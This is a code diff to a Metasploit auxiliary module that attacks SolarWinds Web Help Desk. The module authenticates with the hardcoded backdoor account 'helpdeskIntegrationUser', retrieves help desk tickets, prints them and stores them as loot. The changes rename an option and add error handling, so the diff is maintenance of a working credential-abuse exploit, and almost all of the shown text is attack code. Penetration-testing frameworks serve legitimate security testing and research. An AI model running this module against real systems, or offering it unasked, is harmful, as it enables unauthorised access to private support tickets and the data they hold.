@@ -40,13 +40,14 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new('TARGETURI', [true, 'The base path for Web Help Desk', '/']),
-        OptInt.new('TICKETSTODUMP', [false, 'The number of tickets to dump', 10])
+        OptInt.new('TICKET_COUNT', [false, 'The number of tickets to dump', 10])
       ]
     )
   end
 
   def check
     @auth = auth
+    return Exploit::CheckCode::Unknown('Target is unreachable') unless @auth
 
     if @auth.code == 401
       return Exploit::CheckCode::Safe
@@ -71,9 +72,10 @@ class MetasploitModule < Msf::Auxiliary
   def run
     print_status('Authenticating with the backdoor account "helpdeskIntegrationUser"...')
     @auth ||= auth
+    fail_with(Failure::Unknown, 'Target is unreachable') unless @auth
 
-    body = @auth.body
-    fail_with(Failure::UnexpectedReply, 'Unexpected Reply: ' + @auth.to_s) unless body.include?('shortSubject')
+    jbody = @auth.get_json_document
+    fail_with(Failure::UnexpectedReply, 'Unexpected Reply: ' + @auth.to_s) unless jbody.any? { |item| item.is_a?(Hash) && item.key?('shortSubject') }
 
     report_service(
       host: rhost,
@@ -82,9 +84,8 @@ class MetasploitModule < Msf::Auxiliary
       name: 'SolarWinds Web Help Desk'
     )
 
-    jbody = JSON.parse(body)
-    print_good("Successfully authenticated and tickets retrieved. Displaying the first #{datastore['TICKETSTODUMP']} tickets retrieved:")
-    tickets_to_display = jbody.first(datastore['TICKETSTODUMP'])
+    print_good("Successfully authenticated and tickets retrieved. Displaying the first #{datastore['TICKET_COUNT']} tickets retrieved:")
+    tickets_to_display = jbody.first(datastore['TICKET_COUNT'])
     print_good(JSON.pretty_generate(tickets_to_display))
 
     file = store_loot('solarwinds_webhelpdesk.json', 'text/json', datastore['USER'], jbody)
